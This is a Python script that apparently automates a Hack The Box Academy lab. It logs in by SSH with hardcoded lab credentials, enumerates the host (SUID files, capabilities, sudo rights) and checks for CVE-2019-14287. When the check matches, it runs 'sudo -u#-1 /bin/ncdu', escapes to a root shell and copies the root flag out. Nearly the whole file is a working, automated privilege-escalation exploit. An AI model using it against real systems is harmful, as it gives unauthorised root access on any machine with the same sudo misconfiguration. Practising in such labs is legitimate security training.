#!/usr/bin/env python3

import argparse
import json
import re
import sys
import time
import uuid
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple

import paramiko


DEFAULT_HOST = "10.129.205.110"
DEFAULT_USERNAME = "htb-student"
DEFAULT_PASSWORD = "HTB_@cademy_stdnt!"


@dataclass
class CommandResult:
    command: str
    stdout: str
    stderr: str
    exit_status: int


class TargetClient:
    def __init__(self, host: str, username: str, password: str, port: int = 22):
        self.host = host
        self.username = username
        self.password = password
        self.port = port
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def connect(self) -> None:
        self.client.connect(
            self.host,
            port=self.port,
            username=self.username,
            password=self.password,
            timeout=15,
            banner_timeout=15,
            auth_timeout=15,
        )

    def close(self) -> None:
        self.client.close()

    def run(self, command: str, timeout: int = 45, get_pty: bool = False) -> CommandResult:
        stdin, stdout, stderr = self.client.exec_command(command, timeout=timeout, get_pty=get_pty)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
        code = stdout.channel.recv_exit_status()
        return CommandResult(command=command, stdout=out, stderr=err, exit_status=code)

    def open_shell(self) -> paramiko.Channel:
        channel = self.client.invoke_shell(term="vt100", width=200, height=50)
        channel.settimeout(5)
        return channel


def drain_channel(channel: paramiko.Channel, wait: float = 1.0) -> str:
    time.sleep(wait)
    chunks: List[bytes] = []
    while channel.recv_ready():
        chunks.append(channel.recv(65535))
        time.sleep(0.05)
    return b"".join(chunks).decode(errors="replace")


def recv_until(channel: paramiko.Channel, patterns: List[str], timeout: float) -> str:
    end = time.time() + timeout
    chunks: List[str] = []
    compiled = [re.compile(pattern, re.MULTILINE) for pattern in patterns]

    while time.time() < end:
        if channel.recv_ready():
            chunks.append(channel.recv(65535).decode(errors="replace"))
            combined = "".join(chunks)
            if any(regex.search(combined) for regex in compiled):
                return combined
        else:
            time.sleep(0.1)

    return "".join(chunks)


def enumerate_system(target: TargetClient, password: str) -> Dict[str, CommandResult]:
    commands = {
        "whoami": "whoami",
        "id": "id",
        "hostname": "hostname",
        "os_release": "cat /etc/os-release",
        "kernel": "uname -a",
        "path": "printf '%s\n' \"$PATH\"",
        "env": "env | sort",
        "sudo_version": "sudo -V | head -n 3",
        "sudo_rights": f"echo {shell_quote(password)} | sudo -S -l",
        "ncdu_version": "/bin/ncdu --version",
        "shells": "cat /etc/shells",
        "users": "grep -E 'sh$|bash$|zsh$' /etc/passwd",
        "services": "systemctl list-units --type=service --state=running --no-pager",
        "listening": "ss -lntup",
        "cron": "find /etc/cron* /var/spool/cron -maxdepth 2 -type f -readable -exec ls -lah {} \\; 2>/dev/null",
        "caps": "getcap -r / 2>/dev/null",
        "suid": "find / -perm -4000 -type f 2>/dev/null | sort",
        "readable_flags": "find / -type f \\( -name user.txt -o -name root.txt -o -name flag.txt \\) -readable 2>/dev/null",
        "script_content_hits": "find / -type f -name '*.sh' -readable -exec grep -HnE '(HTB\\{|flag\\{)' {} + 2>/dev/null | head -n 250",
        "home_listing": "find /home -maxdepth 2 -mindepth 1 -printf '%M %u %g %p\\n' 2>/dev/null | sort",
    }

    results: Dict[str, CommandResult] = {}
    for name, command in commands.items():
        results[name] = target.run(command)
    return results


def parse_sudo_version(text: str) -> Optional[Tuple[int, int, int]]:
    match = re.search(r"Sudo version\s+(\d+)\.(\d+)\.(\d+)", text)
    if not match:
        return None
    return tuple(int(part) for part in match.groups())


def version_lt(current: Tuple[int, int, int], expected: Tuple[int, int, int]) -> bool:
    return current < expected


def read_flag_files(target: TargetClient, paths: List[str]) -> Dict[str, str]:
    found: Dict[str, str] = {}
    for path in paths:
        cleaned = path.strip()
        if not cleaned:
            continue
        result = target.run(f"cat {shell_quote(cleaned)}", timeout=15)
        if result.exit_status == 0 and result.stdout.strip():
            found[cleaned] = result.stdout.strip()
    return found


def extract_flags_from_text(text: str) -> List[str]:
    # Capture common CTF-like tokens while avoiding runaway matches.
    pattern = r"(?:HTB\{[^\r\n}]{1,200}\}|flag\{[^\r\n}]{1,200}\})"
    seen: Dict[str, None] = {}
    for match in re.findall(pattern, text, flags=re.IGNORECASE):
        seen[match] = None
    return list(seen.keys())


def collect_discovered_flags(readable_flags: Dict[str, str], script_hits_output: str, root_flag: Optional[str]) -> List[str]:
    flags: Dict[str, None] = {}

    for value in readable_flags.values():
        for found in extract_flags_from_text(value):
            flags[found] = None

    for found in extract_flags_from_text(script_hits_output):
        flags[found] = None

    if root_flag:
        flags[root_flag] = None

    return list(flags.keys())


def shell_quote(value: str) -> str:
    return "'" + value.replace("'", "'\"'\"'") + "'"


def exploit_ncdu_minus_one(target: TargetClient, username: str, password: str) -> Optional[str]:
    temp_path = f"/tmp/.ncdu_flag_{uuid.uuid4().hex}"
    copy_command = (
        f"for candidate in /root/flag.txt /root/root.txt; do "
        f"if [ -r \"$candidate\" ]; then cp \"$candidate\" {shell_quote(temp_path)} && chmod 644 {shell_quote(temp_path)} && chown {shell_quote(username)}:{shell_quote(username)} {shell_quote(temp_path)} && break; fi; "
        f"done\n"
    )

    channel = target.open_shell()
    try:
        recv_until(channel, [r"Welcome to Ubuntu", r"[$#] $"], timeout=5)
        channel.send("sudo -S -u#-1 /bin/ncdu /root\n")
        output = recv_until(channel, [r"password for .*:", r"ncdu 1\.14\.1", r"--- /root"], timeout=10)
        if "password" in output.lower():
            channel.send(password + "\n")
            recv_until(channel, [r"ncdu 1\.14\.1", r"--- /root"], timeout=20)

        channel.send("b")
        recv_until(channel, [r"[$#] $"], timeout=10)
        channel.send(copy_command)
        recv_until(channel, [r"[$#] $"], timeout=5)
        channel.send("exit\n")
        recv_until(channel, [r"ncdu 1\.14\.1", r"--- /root"], timeout=5)
        channel.send("q")
        drain_channel(channel, wait=0.5)
    finally:
        channel.close()

    result = target.run(f"cat {shell_quote(temp_path)} && rm -f {shell_quote(temp_path)}", timeout=20)
    if result.exit_status == 0 and result.stdout.strip():
        return result.stdout.strip().splitlines()[0]
    return None


def build_summary(
    results: Dict[str, CommandResult],
    readable_flags: Dict[str, str],
    discovered_flags: List[str],
    root_flag: Optional[str],
) -> Dict[str, object]:
    sudo_version = parse_sudo_version(results["sudo_version"].stdout)
    sudo_rights = results["sudo_rights"].stdout
    ncdu_version = results["ncdu_version"].stdout.strip()
    minus_one_possible = bool(
        sudo_version
        and version_lt(sudo_version, (1, 8, 28))
        and "!root" in sudo_rights
        and "/bin/ncdu" in sudo_rights
    )

    return {
        "host": results["hostname"].stdout.strip(),
        "user": results["whoami"].stdout.strip(),
        "id": results["id"].stdout.strip(),
        "sudo_version": sudo_version,
        "sudo_rights": sudo_rights.strip(),
        "ncdu_version": ncdu_version,
        "readable_flags": readable_flags,
        "script_content_hits": results["script_content_hits"].stdout.strip(),
        "discovered_flags": discovered_flags,
        "minus_one_ncdu_path": minus_one_possible,
        "root_flag": root_flag,
    }
def print_command_block(title: str, result: CommandResult) -> None:
    print(f"\n[+] {title}: {result.command}")
    if result.stdout.strip():
        print(result.stdout.rstrip())
    if result.stderr.strip():
        print("[stderr]")
        print(result.stderr.rstrip())


def main() -> int:
    parser = argparse.ArgumentParser(description="Enumerate the target and retrieve the flag via SSH.")
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--username", default=DEFAULT_USERNAME)
    parser.add_argument("--password", default=DEFAULT_PASSWORD)
    parser.add_argument("--report", help="Optional path to write a JSON report.")
    parser.add_argument("--skip-exploit", action="store_true", help="Enumerate only, do not attempt privesc.")
    args = parser.parse_args()

    target = TargetClient(args.host, args.username, args.password, args.port)

    try:
        target.connect()
        results = enumerate_system(target, args.password)

        readable_paths = [line for line in results["readable_flags"].stdout.splitlines() if line.strip()]
        readable_flags = read_flag_files(target, readable_paths)

        root_flag: Optional[str] = None
        sudo_version = parse_sudo_version(results["sudo_version"].stdout)
        sudo_rights = results["sudo_rights"].stdout

        if not args.skip_exploit:
            if sudo_version and version_lt(sudo_version, (1, 8, 28)) and "!root" in sudo_rights and "/bin/ncdu" in sudo_rights:
                root_flag = exploit_ncdu_minus_one(target, args.username, args.password)

        discovered_flags = collect_discovered_flags(
            readable_flags,
            results["script_content_hits"].stdout,
            root_flag,
        )

        summary = build_summary(results, readable_flags, discovered_flags, root_flag)

        print_command_block("Identity", results["id"])
        print_command_block("OS", results["os_release"])
        print_command_block("Kernel", results["kernel"])
        print_command_block("Sudo version", results["sudo_version"])
        print_command_block("Sudo rights", results["sudo_rights"])
        print_command_block("ncdu version", results["ncdu_version"])
        print_command_block("Script content hits", results["script_content_hits"])

        if readable_flags:
            print("\n[+] Readable flags found:")
            for path, value in readable_flags.items():
                print(f"- {path}: {value}")
        else:
            print("\n[-] No directly readable flag files were found.")

        if summary["minus_one_ncdu_path"]:
            print("\n[+] Detected sudo CVE-2019-14287 style path: sudo < 1.8.28 with '/bin/ncdu' and '!root'.")

        if root_flag:
            print(f"\n[+] Root flag: {root_flag}")
        elif not args.skip_exploit:
            print("\n[-] Exploit path was detected but the automated root flag retrieval did not complete.")

        if discovered_flags:
            print("\n[+] Discovered flag tokens:")
            for token in discovered_flags:
                print(f"- {token}")
        else:
            print("\n[-] No flag tokens discovered in readable files or helper scripts.")

        if args.report:
            with open(args.report, "w", encoding="utf-8") as handle:
                json.dump(summary, handle, indent=2)
                handle.write("\n")

    except paramiko.AuthenticationException:
        print("Authentication failed.", file=sys.stderr)
        return 1
    except Exception as exc:
        print(f"Error: {exc}", file=sys.stderr)
        return 1
    finally:
        target.close()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())